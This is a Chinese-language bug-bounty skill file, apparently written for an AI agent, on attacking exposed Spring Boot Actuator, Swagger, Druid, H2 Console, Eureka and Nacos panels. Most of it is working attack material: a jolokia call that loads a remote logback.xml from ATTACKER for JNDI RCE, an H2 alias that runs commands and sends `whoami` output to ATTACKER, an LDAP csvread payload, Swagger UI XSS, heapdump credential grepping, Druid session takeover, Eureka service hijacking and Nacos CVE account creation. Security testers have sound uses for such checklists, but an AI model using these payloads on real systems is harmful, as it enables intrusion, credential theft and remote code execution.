---
name: swagger-actuator-druid
description: CWE: CWE-284 / CWE-538 / CWE-668 | OWASP: WSTG-CONF-04 / A05:2021 核心: 开发 / 监控 / 文档面板暴露在外网, 默认无认证或弱认证, 直接读敏感数据 / 调用接口 / 链到 RCE 赏金: 中-严重 $500…
category: vuln
tags: [middleware]
---

# Swagger / Actuator / Druid 未授权访问矩阵

← 回主入口 [../../SKILL.md](../../SKILL.md)

> **CWE**: CWE-284 / CWE-538 / CWE-668 | **OWASP**: WSTG-CONF-04 / A05:2021
> **核心**: 开发 / 监控 / 文档面板暴露在外网, 默认无认证或弱认证, 直接读敏感数据 / 调用接口 / 链到 RCE
> **赏金**: 中-严重 $500-$15000, 单独看是中, 配合后续利用就高

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| `/actuator` / `/actuator/health` 200 | Spring Boot Actuator 暴露 | → [spring-vuln.md](spring-vuln.md) §1 |
| `/swagger-ui.html` / `/v2/api-docs` / `/v3/api-docs` 200 | Swagger 暴露 | §0.2 + §3 接口枚举 |
| `/druid/index.html` / `/druid/login.html` 200 | Druid 监控暴露 | §0.2 + §4 Druid |
| `Whitelabel Error Page` | Spring Boot 指纹 | 试 Actuator 路径 |
| 响应含 `swagger`/`openapi` 字符串 | 接口文档系统 | §3 |
| `/jolokia` / `/heapdump` 直接 200 | 高危端点 | HITL,只取证据片段 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 0.1 Triage 速查

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| `/actuator` 401/403 | 网关拦截 | 试路径规范化绕过 (`/actuator;/env` / `//actuator/env`) |
| swagger 页面 200 但无接口 | 静态文件残留 | 直接抓 `/v2/api-docs` 拿全 endpoint |
| Druid 需登录 | 默认 admin/admin | 试默认凭证;试 §4 unauth path |
| Heapdump 很大 (>50MB) | 真实运行实例 | HITL,只下载证据片段 |
| Actuator 暴露但 env 返 *** | 已脱敏 | 试 heapdump / configprops 搜索 |

### Attack Surface

- Spring Boot Actuator、Swagger/OpenAPI、Druid、H2 Console、Jolokia、Nacos/Apollo/Eureka/Spring Boot Admin。
- 开发/监控/文档面板暴露在公网、测试环境、灰度域名或管理子域。
- Swagger 枚举出的业务 API 与后续未授权、BOLA、弱鉴权链路。

### Pro Tips

- 先区分静态 UI 残留和真实 JSON/API 端点。
- Heapdump、env、jolokia、restart/refresh 属于高敏操作, 只做最小证据并按 HITL 控制。
- Swagger 的价值在接口枚举和鉴权差异, 不要只报告页面可访问。

### Evidence / Rating Boundary

- 静态 Swagger UI 通常只算低价值线索。
- 暴露接口文档 + 可调用未授权业务 API 可按 API 影响定级。
- env/heapdump 明文凭证、Jolokia 写文件/RCE、配置中心敏感配置可进入 High/Critical。

### False Positive Gate

- 排除仅返回 health/up、404 fallback、登录页或样式资源的情况。
- masked env (`***`) 不能当作明文泄露。
- 默认凭据必须证明登录成功或接口可用, 不能只列账号密码字典。

---

## 0.2 速查 — 最高 ROI 的 30 个 endpoint

按"打开就出事"的概率排序:

```
# Spring Boot Actuator (高频)
/actuator
/actuator/env                      # 配置全表 (DB密码 / API key)
/actuator/heapdump                 # 内存快照, 可解出明文凭据
/actuator/jolokia                  # JMX → MBean → RCE
/actuator/jolokia/list
/actuator/jolokia/exec
/actuator/mappings                 # 所有 endpoint
/actuator/configprops              # 所有 @ConfigurationProperties
/actuator/beans                    # 所有 Spring Bean
/actuator/dump                     # 线程转储 (内含 token)
/actuator/threaddump
/actuator/refresh                  # 配置 reload
/actuator/restart                  # DoS / 重启
/actuator/gateway/routes           # Spring Cloud Gateway → SpEL RCE
/actuator/loggers                  # 修改日志级别
/actuator/auditevents
/actuator/scheduledtasks

# Swagger / OpenAPI
/swagger-ui.html
/swagger-ui/
/swagger-ui/index.html
/v2/api-docs                        # Swagger 2 JSON
/v3/api-docs                        # OpenAPI 3 JSON
/swagger
/api-docs
/api/swagger.json
/openapi.json
/swagger-resources
/swagger-resources/configuration/security

# Druid (国内 Java 必查)
/druid/index.html                   # SQL 监控面板
/druid/sql.html                     # SQL 列表
/druid/datasource.html              # 数据源信息
/druid/login.html                   # 登录(默认 admin/admin)
/druid/websession.html              # Session 管理

# 其他高频
/h2-console                          # H2 数据库控制台 → JdbcDriver alias RCE
/eureka                              # Spring Cloud 服务注册中心
/eureka/apps                         # 列出所有服务
/jolokia                             # 独立 jolokia (非 actuator 子路径)
/jolokia/list
/__webpack_hmr                       # 前端泄露源码
/.well-known/openid-configuration   # OIDC 配置
/console                             # 通用 admin
/admin
/manage                              # Spring Boot Admin
/sba                                 # Spring Boot Admin v2
/api/swagger
/swagger-ui/swagger-config
```

---

## 1. Spring Boot Actuator 详解

### 1.1 默认端口与认证

- 默认与业务同端口 (e.g. 8080), 也可配独立 management port (e.g. 8081)
- Spring Boot 1.x: 默认全开 + 无认证
- Spring Boot 2.x: 默认只开 `/health` `/info`, 但管理员常配 `management.endpoints.web.exposure.include=*` 一键全开

### 1.2 各 endpoint 价值

| Endpoint | 数据 | 利用 |
|----------|------|------|
| `/env` | 所有环境变量 + 配置 | 提取 `spring.datasource.password` / `redis.password` / `aws.secret` 等 |
| `/env` POST (1.x) | **可写**, 修改运行时配置 | 改 SpEL → RCE |
| `/heapdump` | 内存 dump (.hprof) | jhat / VisualVM 解析, grep 字符串 |
| `/jolokia/list` | MBean 列表 | 找 Tomcat / Logback 等可控 MBean |
| `/jolokia/exec/<MBean>/<op>/<args>` | 调用 MBean | 写文件 / 执行 命令 |
| `/mappings` | 所有 endpoint URI | 发现隐藏接口 |
| `/configprops` | 配置类绑定值 | 类似 env, 但更结构化 |
| `/beans` | 所有 Spring Bean | 看依赖, 推断业务逻辑 |
| `/threaddump` | 线程栈 | 含 SQL 语句 / 临时变量 |
| `/auditevents` | 登录审计 | 用户名枚举 |
| `/loggers` | 日志级别管理 | POST 修改 (debug 暴露更多) |
| `/refresh` (Spring Cloud) | 配置 reload | 配合外部 nacos 投毒 |
| `/restart` (Spring Boot Admin) | 重启 | DoS |
| `/gateway/routes` (Spring Cloud Gateway) | 添加路由 | SpEL RCE 见 [spring-vuln.md](spring-vuln.md) §3 |

### 1.3 heapdump 利用

下载 .hprof 后用工具提取凭据:

```bash
# 方法 1: heaphero (在线/本地)
# 上传 hprof, 自动找 String / DataSource 类

# 方法 2: jhat (JDK 自带)
jhat -port 7000 heapdump.hprof
# 浏览器访问 http://localhost:7000

# 方法 3: VisualVM 加载, 用 OQL 查询
SELECT obj FROM java.lang.String obj WHERE /password|secret|token/(toString(obj))

# 方法 4: 命令行 grep (最快)
strings heapdump.hprof | grep -E "password|secret|access[_-]?key|jdbc:" | sort -u
```

### 1.4 jolokia → RCE 链

```bash
# 1. 列出 MBean
curl https://target.com/actuator/jolokia/list

# 2. 找可控类: ch.qos.logback.classic.jmx.JMXConfigurator (Logback 远程加载配置)
curl -X POST https://target.com/actuator/jolokia \
  -H "Content-Type: application/json" \
  -d '{
    "type":"exec",
    "mbean":"ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator",
    "operation":"reloadByURL",
    "arguments":["http://ATTACKER/logback.xml"]
  }'

# 3. ATTACKER/logback.xml 里包含 <insertFromJNDI ...> 触发 JNDI lookup → RCE
```

或者:

```bash
# Tomcat MemoryUserDatabase MBean → 写文件
# realmConfig.contextRoot MBean → 写 webshell
```

---

## 2. Swagger / OpenAPI 利用

### 2.1 直接价值

```bash
# 拿到 Swagger JSON
curl https://target.com/v2/api-docs > swagger.json
curl https://target.com/v3/api-docs > openapi.json

# 解析所有 endpoint + 参数 + auth 要求
# 用工具: swagger-codegen / openapi-generator 生成客户端代码
```

**关键收益**:
- 列出**所有内部 API** (含未在前端暴露的)
- 知道每个 endpoint 的参数名 / 类型 / 是否需要 auth
- 找到 **Object 类型参数** → Fastjson / Jackson 反序列化目标
- 看到 **admin** / **internal** / **debug** 命名的接口

### 2.2 Swagger UI XSS

旧版 Swagger UI < 3.x 在 `url` query param 处可注入 XSS:

```
https://target.com/swagger-ui.html?url=javascript:alert(1)
https://target.com/swagger-ui/index.html?url=//ATTACKER/swagger.json (远程加载)
```

### 2.3 自动化测 swagger 列出的接口

```bash
# swagger_hack 工具 (国内)
python3 swagger_hack.py -u https://target.com/v2/api-docs

# nuclei + custom template
${NUCLEI_PATH}/nuclei.exe -tags swagger -l urls.txt
```

---

## 3. Druid 监控面板

### 3.1 默认凭据 + 未授权

| URL | 内容 |
|-----|------|
| `/druid/index.html` | 主页, 即使未登录可能能看 |
| `/druid/login.html` | 登录页, 默认 `admin/admin` 或 `admin/123456` |
| `/druid/sql.html` | **执行的 SQL 列表 + 参数 (含敏感数据!)** |
| `/druid/datasource.html` | 数据源连接串 (包含 jdbc:mysql://internal:3306/db?user=...&password=...) |
| `/druid/websession.html` | Session 列表, **可拿其他用户 Session 接管** |
| `/druid/weburi.html` | 访问的 URI 统计 (找隐藏接口) |
| `/druid/webapp.html` | 应用信息 |

### 3.2 利用步骤

```bash
# 1. 直接访问 (大概率未授权)
curl https://target.com/druid/index.html

# 2. 若需登录, 试默认凭据
curl -X POST https://target.com/druid/submitLogin \
  -d "loginUsername=admin&loginPassword=admin"

# 3. 拿 session 接管
curl https://target.com/druid/websession.html
# 解析每个 session ID, 用 Cookie 发请求

# 4. 看 SQL 监控提取敏感参数
curl https://target.com/druid/sql.html
```

---

## 4. H2 Console (RCE)

### 4.1 H2 Console 默认开启

```bash
curl https://target.com/h2-console
# 看到登录页 → 大概率漏洞
```

### 4.2 利用 (RCE via JdbcDriver Alias)

```sql
-- 1. 登录: 任意 JDBC URL, 比如 jdbc:h2:mem:exploit
-- 2. 执行 SQL:
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('curl ATTACKER/`whoami`');
```

或:

```sql
-- 通过 JNDI 加载 (绕过部分沙箱)
SELECT * FROM csvread('ldap://ATTACKER:1389/Exploit');
```

---

## 5. Eureka / Nacos / Apollo / Spring Boot Admin

### 5.1 Eureka

```bash
# 列出所有微服务
curl https://target.com/eureka/apps

# 注册恶意服务 (劫持流量)
curl -X POST https://target.com/eureka/apps/EVIL \
  -H "Content-Type: application/json" \
  -d '{"instance":{...}}'
```

### 5.2 Nacos

```bash
# 默认密码 nacos/nacos
curl https://target.com/nacos/v1/auth/users/login -d "username=nacos&password=nacos"

# 未授权列出配置 (CVE-2021-29442)
curl https://target.com/nacos/v1/cs/configs?dataId=xxx&group=DEFAULT

# 添加用户 (CVE-2021-29441)
curl -X POST 'https://target.com/nacos/v1/auth/users?username=hacker&password=hacker' \
  -H "User-Agent: Nacos-Server"
```

### 5.3 Apollo

```bash
# Apollo Portal / Admin 默认 apollo/admin
# 配置中心拿到所有 microservice 的 application.properties
```

### 5.4 Spring Boot Admin

```bash
curl https://target.com/applications
# 列出所有被监控的 Spring Boot 应用 + actuator 链接
# 单点登录后可逐个调 restart/refresh
```

---

## 6. Testing Checklist

### 6.1 Actuator
- [ ] 探 30 个常见 actuator endpoint
- [ ] `/env` → grep password / secret / key
- [ ] `/heapdump` → 下载 + strings/jhat 解析
- [ ] `/jolokia/list` → 找可控 MBean
- [ ] `/gateway/routes` → 测 SpEL 注入
- [ ] 端口 8081 / 9001 / 9090 (常见 management port)
- [ ] 配合 Shiro 路径绕过 (`/xxx;/actuator/...`)

### 6.2 Swagger
- [ ] `/swagger-ui.html` `/swagger-ui/` `/v2/api-docs` `/v3/api-docs`
- [ ] 解析 JSON 生成接口清单
- [ ] 找 Object / Map 参数 → Fastjson 候选
- [ ] 找 admin / internal / debug 命名接口
- [ ] swagger url= 参数试 XSS

### 6.3 Druid
- [ ] `/druid/index.html` 直接访问
- [ ] 默认密码 admin/admin / admin/123456
- [ ] sql.html 抓 SQL 监控 (敏感数据)
- [ ] websession.html 拿 Session 接管

### 6.4 其他
- [ ] /h2-console RCE
- [ ] /eureka/apps 列服务
- [ ] /nacos/* 默认凭据 + 未授权 CVE
- [ ] /applications (Spring Boot Admin)
- [ ] /jolokia 独立路径

---

## 7. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| `/actuator` 返回 401 | 试 Shiro 路径绕过 / 改 management port |
| `/env` 返回但密码字段是 `******` | Spring Boot 2.x 默认隐藏, 试 POST 修改或读 heapdump |
| `/heapdump` 返回 200 但 0 字节 | 配置错, 换 /actuator/dump |
| Swagger JSON 返回但无 endpoint | API 自动生成可能为空, 看是否有 `/v3/api-docs/group-x` 分组 |
| Druid 主页打开但无数据 | 监控未启用, 仍可看 datasource.html 拿连接串 |
| Nacos 默认密码不通 | 改过, 试 CVE-2021-29442 未授权配置查询 |

---

## 8. 影响证明

### Actuator
- **低**: 端点暴露 / 列表
- **中**: env 拿明文密码 / heapdump 拿凭据
- **高**: jolokia → MBean → 写文件
- **严重**: SpEL Cloud Gateway → RCE / 拿到 k8s ServiceAccount Token

### Swagger
- **低**: API 文档可访问
- **中**: 列出隐藏 admin endpoint (待后续利用)
- **高**: 配合 Object 反序列化打 RCE

### Druid
- **低**: 主页可访问
- **中**: SQL 监控泄露内部数据
- **高**: 拿到 jdbc 连接串 (含密码) / Session 接管

---

## 9. 相关参考

- 主入口 → [../../SKILL.md](../../SKILL.md)
- Spring 漏洞家族 → [spring-vuln.md](spring-vuln.md)
- Shiro (路径绕过 + actuator) → [shiro.md](shiro.md)
- Fastjson / Jackson (Swagger 找入口后利用) → [fastjson-jackson.md](fastjson-jackson.md)
- JNDI / Log4Shell (jolokia logback gadget) → [jndi-log4shell.md](jndi-log4shell.md)
- 路径规范化绕过 → [path-traversal.md](path-traversal.md)
- 云安全 (k8s ServiceAccount Token) → [../cloud-security.md](../cloud-security.md)
- 认证逻辑 (默认凭据) → [../auth-logic.md](../auth-logic.md)

---

**CWE**: CWE-284 / CWE-538 / CWE-668 | **WSTG**: CONF-04 | **CVSS 典型**: 7.5 (env / 配置泄露) / 9.8 (jolokia → RCE) / 8.6 (Druid Session 接管)
